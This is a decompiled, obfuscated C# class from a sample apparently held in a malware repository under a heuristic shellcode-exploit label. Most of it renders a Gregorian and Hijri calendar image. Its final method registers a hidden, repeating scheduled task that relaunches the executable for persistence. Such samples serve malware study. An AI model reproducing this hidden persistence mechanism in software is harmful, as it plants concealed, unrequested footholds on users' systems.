// Decompiled with JetBrains decompiler
// Type: 942981470147.Core.682580147494
// Assembly: 942981470147, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: 92EB186D-EC33-4501-B5FF-A65C9233BC32
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Exploit.MSIL.Shellcode.gen-f8bb0d6e016074f6759f74d8950983793a87aec3cd6d56569fa8809d5c55396a.exe

using \u003942981470147.Core;
using \u003942981470147.Models;
using \u003942981470147.Utils;
using Microsoft.Win32.TaskScheduler;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Text;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace \u003942981470147.Core
{
  public class \u003682580147494 : IDisposable
  {
    private const int \u003830748606355 = 130;
    private const int \u003693090595810 = 15;
    private const string \u003066776317221 = "31";
    private const int \u003211430333888 = 70;
    private const int \u003761165051948 = 20;
    private readonly int \u003606054437395;
    private readonly Graphics \u003305734847614;
    private readonly Image \u003042178751206;
    private readonly int \u003027207294556;
    private readonly int \u003862671641487;
    private Color \u003582116710733;
    private bool \u003237160640337;
    private Color \u003079657490605;
    private Color \u003783466782857;
    private int \u003962129956734;
    private int \u003972496530298;
    private int \u003558031979304;
    private IList<Point> \u003200422625977;
    private int \u003554480110467;
    internal static readonly long \u003823256314984;

    public string \u003690160013628 { set; get; }

    public int \u003112357187019 { set; get; }

    public string \u003969998406876 { set; get; }

    public int \u003757758748557 { set; get; }

    public string \u003583896585900 { set; get; }

    public IList<\u003349945968399> \u003739704159771 { set; get; }

    public int \u003333149300123 { set; get; }

    public bool \u003515559557430 { set; get; }

    public Color \u003299035849765 { set; get; }

    public bool \u003873819477958 { set; get; }

    public void \u003462036575954()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    public Image \u003086184671888()
    {
      this.\u003182869718797();
      this.\u003490166741771();
      this.\u003590274780001();
      this.\u003200422625977 = (IList<Point>) this.\u003927324514406();
      this.\u003069930045069();
      this.\u003024945545851();
      this.\u003143738148659();
      return this.\u003042178751206;
    }

    protected virtual void Dispose(bool disposeManagedResources)
    {
      if (this.\u003237160640337 || !disposeManagedResources)
        return;
      this.\u003305734847614?.Dispose();
      this.\u003237160640337 = true;
    }

    private List<Point> \u003927324514406()
    {
      List<Point> pointList = new List<Point>();
      for (int index1 = 0; index1 < 7; ++index1)
      {
        for (int index2 = 0; index2 < 7; ++index2)
        {
          Point point = new Point(this.\u003962129956734 + index2 * this.\u003558031979304, this.\u003554480110467 + index1 * this.\u003972496530298);
          pointList.Add(point);
        }
      }
      return pointList;
    }

    private void \u003024945545851()
    {
      List<\u003349945968399> objList = new List<\u003349945968399>();
      int num1 = \u003305982662191.\u003110008563471(this.\u003862671641487, this.\u003027207294556);
      int num2 = this.\u003027207294556 <= 6 ? 31 : 30;
      if (this.\u003027207294556 - 1 == 11)
        num2 = \u003365656532327.\u003158844607454(this.\u003862671641487) ? 30 : 29;
      int num3 = 1;
      int num4 = num1 + 1;
      foreach (Point point in this.\u003200422625977.Skip<Point>(7).Take<Point>(7 - num1).Reverse<Point>().ToList<Point>())
      {
        this.\u003673534683804(num3, num4, point, (IList<\u003349945968399>) objList);
        ++num4;
        ++num3;
      }
      List<Point> list = this.\u003200422625977.Skip<Point>(14).ToList<Point>();
      int count = 0;
      Point point1 = new Point(this.\u003962129956734, this.\u003554480110467 + 7 * this.\u003972496530298);
      while (num3 <= num2)
      {
        IEnumerable<Point> points = list.Skip<Point>(count).Take<Point>(7).Reverse<Point>();
        int num5 = 1;
        foreach (Point point2 in points)
        {
          this.\u003673534683804(num3, num5, point2, (IList<\u003349945968399>) objList);
          ++num5;
          ++num3;
          if (num3 > num2)
          {
            point1 = point2;
            break;
          }
        }
        count += 7;
      }
      this.\u003899110738557((IList<\u003349945968399>) objList, point1);
    }

    private void \u003673534683804(
      int _param1,
      int _param2,
      Point _param3,
      IList<\u003349945968399> _param4)
    {
      Color? nullable = _param1 == this.\u003606054437395 ? new Color?(this.\u003299035849765) : new Color?();
      \u003349945968399 obj = this.\u003665387636394(_param1);
      if (obj != null)
      {
        if (_param1 != this.\u003606054437395)
          nullable = new Color?(this.\u003783466782857);
        if (this.\u003515559557430 || _param1 >= this.\u003606054437395)
        {
          obj.\u003003663362962 = this.\u003606054437395 == _param1;
          _param4.Add(obj);
        }
      }
      if (_param2 == 7 && _param1 != this.\u003606054437395)
        nullable = new Color?(this.\u003783466782857);
      string str = _param1.ToString((IFormatProvider) CultureInfo.InvariantCulture).\u003524490185873();
      this.\u003870909049259(_param3, str, this.\u003558031979304, this.\u003112357187019, nullable);
    }

    private void \u003069930045069()
    {
      for (int index = 6; index >= 0; --index)
      {
        string str = \u003559406450640.\u003565815906085[6 - index];
        this.\u003870909049259(this.\u003200422625977[index], str, this.\u003558031979304, this.\u003112357187019, \u003454023839593: true);
      }
    }

    private IEnumerable<\u003967571795739> \u003067103646868()
    {
      CultureInfo provider = new CultureInfo("ar-SA")
      {
        DateTimeFormat = {
          Calendar = (Calendar) new HijriCalendar()
        }
      };
      DateTime now = DateTime.Now;
      \u003967571795739[] objArray = new \u003967571795739[3];
      \u003967571795739 obj1 = new \u003967571795739();
      ((\u003166520425901) obj1).set_Day(this.\u003606054437395.ToString());
      obj1.\u003992406212191 = \u003186298523234.\u003346646644544[this.\u003027207294556 - 1] + " " + this.\u003862671641487.ToString((IFormatProvider) CultureInfo.InvariantCulture).\u003524490185873();
      objArray[0] = obj1;
      \u003967571795739 obj2 = new \u003967571795739();
      ((\u003166520425901) obj2).set_Day(string.Format("{0}", (object) int.Parse(now.ToString("dd", (IFormatProvider) provider))));
      obj2.\u003992406212191 = now.ToString("MMMM yyyy", (IFormatProvider) provider) ?? "";
      objArray[1] = obj2;
      \u003967571795739 obj3 = new \u003967571795739();
      ((\u003166520425901) obj3).set_Day(now.Day.ToString());
      obj3.\u003992406212191 = now.ToString("yyyy, MMMM", (IFormatProvider) CultureInfo.InvariantCulture) ?? "";
      objArray[2] = obj3;
      return (IEnumerable<\u003967571795739>) objArray;
    }

    private string \u003272323812699() => Path.Combine(\u003313364816402.\u003529684597097(), "fonts", this.\u003690160013628);

    private \u003349945968399 \u003665387636394(int _param1)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      \u003682580147494.\u003779795469370 obj = (\u003682580147494.\u003779795469370) new \u003682580147494.\u003193376359599();
      // ISSUE: reference to a compiler-generated field
      ((\u003682580147494.\u003193376359599) obj).\u003855776124075 = this;
      // ISSUE: reference to a compiler-generated field
      obj.\u003645527227759 = _param1;
      // ISSUE: reference to a compiler-generated method
      return this.\u003739704159771.FirstOrDefault<\u003349945968399>(new Func<\u003349945968399, bool>(obj.\u003060153926149));
    }

    private SizeF \u003896710833747(int _param1_1)
    {
      List<SizeF> source = new List<SizeF>();
      foreach (string str in \u003559406450640.\u003565815906085)
        source.Add(this.\u003124848525026(str, this.\u003112357187019));
      source.Add(this.\u003124848525026("31", this.\u003112357187019));
      float num = source.Select<SizeF, float>((Func<SizeF, float>) (_param1_2 => _param1_2.Height)).Max();
      return new SizeF(source.Select<SizeF, float>((Func<SizeF, float>) (_param1_3 => _param1_3.Width)).Max() + (float) _param1_1, num + (float) _param1_1);
    }

    private SizeF \u003124848525026(string _param1, int _param2)
    {
      string str = this.\u003272323812699();
      return \u003204070322599.\u003135215512330(_param1, _param2, FontStyle.Regular, str);
    }

    private void \u003143738148659()
    {
      if (!this.\u003873819477958)
        return;
      using (Font font = new Font(this.\u003969998406876, (float) this.\u003757758748557, FontStyle.Regular, GraphicsUnit.Pixel))
      {
        SizeF sizeF = \u003204070322599.\u003491433329017(this.\u003583896585900, font);
        this.\u003870909049259(new Point((int) ((double) this.\u003042178751206.Width - (246.0 + (double) sizeF.Width + 5.0)), this.\u003042178751206.Height - 120), this.\u003583896585900, (int) sizeF.Width + 20, this.\u003757758748557, \u003829092063837: false, \u003355322146191: font);
      }
    }

    private void \u003590274780001()
    {
      int num1 = this.\u003972496530298 + 20;
      int num2 = this.\u003558031979304;
      int num3 = this.\u003558031979304 * 6;
      int num4 = 0;
      foreach (\u003967571795739 obj in this.\u003067103646868())
      {
        Point point = new Point(this.\u003042178751206.Width - (70 + num2), num1 + num4 * this.\u003972496530298);
        this.\u003870909049259(point, obj.\u003111657757356, num2, this.\u003333149300123, new Color?(this.\u003079657490605));
        point = new Point(this.\u003042178751206.Width - (70 + num3 + num2), num1 + num4 * this.\u003972496530298);
        this.\u003870909049259(point, obj.\u003992406212191, num3, this.\u003333149300123, new Color?(this.\u003079657490605));
        ++num4;
      }
      this.\u003554480110467 = 4 * this.\u003972496530298 + 20;
    }

    private void \u003899110738557(IList<\u003349945968399> _param1, Point _param2)
    {
      int num = 2;
      float width1 = this.\u003124848525026("31", this.\u003333149300123).Width;
      foreach (\u003349945968399 obj in (IEnumerable<\u003349945968399>) _param1)
      {
        float width2 = this.\u003124848525026(obj.\u003338123244339, this.\u003333149300123).Width;
        Point point = new Point((int) ((double) this.\u003042178751206.Width - (70.0 + (double) width1 + 5.0)), _param2.Y + num * this.\u003972496530298);
        this.\u003870909049259(point, obj.\u003002686188589.ToString(), (int) width1 + 5, this.\u003333149300123, new Color?(obj.\u003003663362962 ? this.\u003299035849765 : this.\u003783466782857));
        point = new Point((int) ((double) this.\u003042178751206.Width - (70.0 + (double) width2 + (double) width1 + 10.0)), _param2.Y + num * this.\u003972496530298);
        this.\u003870909049259(point, obj.\u003338123244339, (int) width2 + 5, this.\u003333149300123, new Color?(obj.\u003003663362962 ? this.\u003299035849765 : this.\u003783466782857));
        ++num;
      }
    }

    private void \u003870909049259(
      Point _param1,
      string _param2,
      int _param3,
      int _param4,
      Color? _param5 = null,
      bool _param6 = true,
      bool _param7 = false,
      Font _param8 = null)
    {
      int x = _param1.X;
      int y = _param1.Y;
      double num = _param8 == null ? (double) this.\u003124848525026(_param2, _param4).Height : (double) \u003204070322599.\u003491433329017(_param2, _param8).Height;
      int height = (int) num + 15;
      if (num > (double) this.\u003972496530298)
        y -= height - this.\u003972496530298;
      Color color1 = !_param5.HasValue ? this.\u003582116710733 : Color.FromArgb(110, _param5.Value);
      if (_param7)
        color1 = color1.\u003823051862671(-0.12f);
      Rectangle layoutRectangle = new Rectangle(x, y, _param3, height);
      Graphics graphics = this.\u003305734847614;
      Rectangle rectangle = layoutRectangle;
      Pen pen = new Pen(color1);
      pen.Width = 1.1f;
      Color color2 = color1;
      \u003204070322599.\u003498481450222(graphics, rectangle, 15, pen, color2);
      StringFormat format = new StringFormat()
      {
        LineAlignment = StringAlignment.Center,
        Alignment = StringAlignment.Center,
        FormatFlags = _param6 ? StringFormatFlags.DirectionRightToLeft : StringFormatFlags.NoClip
      };
      this.\u003305734847614.TextRenderingHint = TextRenderingHint.AntiAlias;
      Color color3 = color1.\u003045864448512() < 130 ? Color.White : Color.Black;
      if (_param8 != null)
      {
        this.\u003305734847614.DrawString(_param2, _param8, (Brush) new SolidBrush(color3), (RectangleF) layoutRectangle, format);
      }
      else
      {
        using (PrivateFontCollection privateFontCollection = new PrivateFontCollection())
        {
          privateFontCollection.AddFontFile(this.\u003272323812699());
          using (FontFamily family = privateFontCollection.Families[0])
          {
            using (Font font = new Font(family, (float) _param4, FontStyle.Regular, GraphicsUnit.Pixel))
              this.\u003305734847614.DrawString(_param2, font, (Brush) new SolidBrush(color3), (RectangleF) layoutRectangle, format);
          }
        }
      }
    }

    private void \u003153332025861()
    {
      this.\u003582116710733 = this.\u003042178751206.\u003128664583213(new Rectangle(this.\u003962129956734 - 70, 0, this.\u003042178751206.Width, this.\u003042178751206.Height / 2)).\u003817621485411();
      this.\u003582116710733 = Color.FromArgb(190, this.\u003582116710733);
      while (this.\u003582116710733.\u003045864448512() >= 130)
        this.\u003582116710733 = this.\u003582116710733.\u003823051862671(-0.01f);
    }

    private void \u003490166741771()
    {
      this.\u003153332025861();
      this.\u003783466782857 = this.\u003582116710733.\u003823051862671(-0.7f);
      this.\u003079657490605 = this.\u003582116710733.\u003823051862671(-0.4f);
    }

    private void \u003182869718797()
    {
      SizeF sizeF = this.\u003896710833747(15);
      this.\u003972496530298 = (int) sizeF.Height;
      this.\u003558031979304 = (int) sizeF.Width;
      this.\u003962129956734 = this.\u003042178751206.Width - (70 + 7 * this.\u003558031979304);
    }

    public static void \u003805239628971()
    {
      try
      {
        ExecAction execAction = new ExecAction(Application.ExecutablePath, (string) null, Application.StartupPath);
        using (TaskDefinition taskDefinition = TaskService.Instance.NewTask())
        {
          int num = TaskService.Instance.HighestSupportedVersion >= new Version(1, 2) ? 1 : 0;
          taskDefinition.RegistrationInfo.Description = "942981470147 Runner";
          taskDefinition.RegistrationInfo.Author = "DNT";
          taskDefinition.Settings.Hidden = true;
          taskDefinition.Settings.Enabled = true;
          taskDefinition.Settings.DisallowStartIfOnBatteries = false;
          taskDefinition.Settings.StopIfGoingOnBatteries = false;
          if (num != 0)
          {
            taskDefinition.Settings.StartWhenAvailable = true;
            taskDefinition.Settings.MultipleInstances = (TaskInstancesPolicy) 2;
          }
          TimeTrigger timeTrigger1 = \u003934650028661.\u003404760236206();
          if (num == 0)
            ((Trigger) timeTrigger1).Repetition.Duration = TimeSpan.FromHours(1.1);
          taskDefinition.Triggers.Add((Trigger) timeTrigger1);
          TimeTrigger timeTrigger2 = \u003934650028661.\u003364817891721();
          if (num == 0)
            ((Trigger) timeTrigger2).Repetition.Duration = TimeSpan.FromHours(1.1);
          taskDefinition.Triggers.Add((Trigger) timeTrigger2);
          taskDefinition.Actions.Add((Action) execAction);
          TaskService.Instance.RootFolder.RegisterTaskDefinition("942981470147 Runner", taskDefinition, (TaskCreation) 6, (string) null, (string) null, (TaskLogonType) 3, (string) null);
        }
        Console.WriteLine("`942981470147 Runner` task has been added.");
      }
      catch (Exception ex)
      {
        ex.\u003783976718808();
      }
    }
  }
}
